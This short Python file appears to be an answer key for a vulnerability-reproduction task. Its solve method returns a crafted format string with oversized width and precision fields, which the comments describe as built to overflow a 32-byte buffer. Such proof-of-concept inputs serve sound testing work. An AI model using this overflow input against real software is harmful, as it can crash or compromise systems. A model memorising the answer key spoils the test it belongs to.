import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Format string that exceeds 32-byte buffer: 40 bytes total
        # Components: flag (1), width (18), period (1), precision (18), specifier (1)
        return b"%019999999999999999.019999999999999999d"
